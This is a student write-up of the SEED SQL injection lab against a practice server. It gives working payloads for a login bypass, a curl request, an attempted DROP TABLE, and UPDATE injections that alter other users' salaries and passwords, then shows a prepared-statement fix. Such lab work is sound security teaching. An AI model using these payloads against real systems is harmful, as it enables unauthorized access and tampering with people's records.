# SQL Injection Attack Lab

## Task 1: Get Familiar with SQL Statements

```
mysql> select * from credential where name = "Alice";
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
1 row in set (0.00 sec)
```

## Task 2: SQL Injection Attack on SELECT Statement

### SQL Injection Attack from webpage

Username: `admin';-- `
Password: (empty)

This ends the query early and comments out the password check.

### SQL Injection Attack from command line

```
$ curl 'www.seed-server.com/unsafe_home.php?username=admin%27;--%20&Password='
...returns HTML including table of all user details...
```

### Append a new SQL statement

Username: `admin'; DROP TABLE credential;-- `
Password: (empty)

This does not work, because PHP's `mysqli::query()` API does not allow multiple queries.

## Task 3: SQL Injection Attack on UPDATE Statement

### Modify your own salary

NickName: `', salary='99999`
(other fields blank, optionally re-enter password)

This escapes the `nickname` value, adds the `salary` field, then re-enters the rest of the SQL statement including the closing quote of the `nickname` value.

### Modify other people's salary

NickName: `', salary=1 WHERE Name='Boby';-- `
(other fields blank)

This time, we escape the `nickname` value and do not re-enter the rest of the original SQL statement, commenting it out instead.

### Modify other people's password

NickName: `', Password=SHA1('gottem') WHERE Name='Boby';-- `
(other fields blank)

Here, we use the `SHA1()` function in MySQL to compute the password hash ourselves.

## Task 4: Countermeasure — Prepared Statement

Modified section of `unsafe.php`:

```php
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
                        FROM credential
                        WHERE name = ? and Password = ? ");
$stmt->bind_param("ss", $input_uname, $hashed_pwd);
$stmt->execute();
$stmt->bind_result($id, $name, $eid, $salary, $ssn);
$stmt->fetch();
```

By using a prepared statement, the separation between code and data is enforced at the boundary where the programmer intended, preventing SQL injection attacks. Indeed, the first query from Task 2 worked on the old version of `unsafe.php` but not on the new version using a prepared statement.